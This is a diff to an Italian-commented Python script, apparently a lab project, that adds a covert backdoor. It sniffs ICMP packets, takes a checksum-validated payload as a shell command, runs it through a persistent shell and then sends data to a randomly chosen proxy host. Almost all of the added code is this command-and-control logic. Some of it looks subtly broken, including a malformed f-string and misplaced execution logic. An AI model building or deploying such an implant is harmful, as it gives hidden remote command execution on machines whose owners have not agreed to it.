@@ -6,6 +6,8 @@ import mymethods
 import time 
 import comunication_methods as com
 import re
+import random
+import sys
 
 sniffed_data=None    
 
@@ -99,7 +101,7 @@ def def_global_variables():
     proxy_ip=[]
 
 #-- Main --#
-if __name__=="__main__":
+def part_1():
     #1) Definizione degli argomenti
     try:
         def_global_variables()
@@ -116,7 +118,97 @@ if __name__=="__main__":
         conn_from_proxy()
     except Exception as e:
         print(f"An Exception has occured: {e}") 
-        exit(1)  
+        exit(1)
+
+def execute_command(command): 
+    if isinstance(command, bytes):
+        command=command.decode()
+    #if not isinstance(command, str):
+        #command=str(command) 
+    supportedSystems=["linux","win32"] 
+    if sys.platform not in supportedSystems:
+        print(f"Sistema {sys.platform} non supportato...")
+        exit(1)
+    print("Sistema supportato...")
+    try:
+        shell_process=mymethods.getShellProcess()
+    except Exception as e:
+        print(f"Errore nell'apertura della shell: {e}")
+        shell_process=None
+    if shell_process is None:
+        print("Errore nell'apertura della shell")
+        exit(1)
+    print("Shell aperta con successo...")
+    print(f"Esecuzione comando: {command}")
+    shell_process.stdin.write(f"{command.replace('\n','' '')}; echo __END__ \n")
+    shell_process.stdin.flush()
+    print(f"Did command failed? {shell_process.poll()}")
+    while True: 
+        if shell_process.poll() is not None: 
+            error_line=shell_process.stderr.readline()
+            print(f"Error: {error_line}") 
+        error_line=shell_process.stderr.readline()
+        output_line = shell_process.stdout.readline() 
+        if error_line: 
+            print(f"Error: {error_line}") 
+        print(f"Output: {output_line}", end='') 
+        if not output_line:
+            print(f"EOF {output_line}") 
+            break
+        if output_line.strip() == "__END__".strip():
+            print(f"No more lines")
+            break 
+    print(f"Command finished with exit code {shell_process.poll()}")
+    #shell_process.wait()  # Attende la chiusura del processo
+    #shell_process.terminate()  # Termina il processo
+
+def callback_receive_command(packet):
+    global command
+    if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):
+        checksum=mymethods.calc_checksum(packet[Raw].load)
+        print(f"Payload received:\t{packet[Raw].load}")
+        print(f"ICMP ID:\t{packet[ICMP].id}")
+        print(f"Checksum:\t{checksum}")
+        if packet[ICMP].id==checksum:
+            command=packet[Raw].load
+            com.set_pkt_conn_received() 
+
+def part_2():
+    global command 
+    global ip_host, gateway_host
+    ip_host="192.168.56.102"
+    gateway_host="192.168.56.0"
+    command=None
+    print("Waiting for a command...")
+    args={
+        "filter":f"icmp and dst {ip_host}" 
+        #,"count":1 
+        ,"prn":callback_receive_command 
+        #,"store":True 
+        ,"iface":mymethods.iface_from_IP(gateway_host)[1] 
+    }
+    com.sniff_packet(args,None) 
+    com.wait_pkt_conn_received() 
+    print(f"Comando ricevuto: {command}")
+    if com.sniffer.running: 
+        com.sniffer.stop() 
+    if com.timeout_timer.is_alive(): 
+        com.timeout_timer.cancel() 
+        try:
+            execute_command(command.decode())
+        except Exception as e:
+            print(f"part_2: execute_command: {e}")
+        data="dati derivati dal comando".encode()
+        chosen_proxy=random.choice(proxy_ip)
+        if com.send_packet(data, chosen_proxy):
+            print(f"Dati mandati a {chosen_proxy}")
+    print(f"I proxy utilzzabili sono: {len(proxy_ip)}\n\t{proxy_ip}") 
+
+if __name__=="__main__":
+    global proxy_ip
+    proxy_ip=["192.168.56.101"]
+    #part_1()
+    part_2()
     exit(0) 
     #thread = threading.Thread(target=sniff_4_start)
     #thread.start()
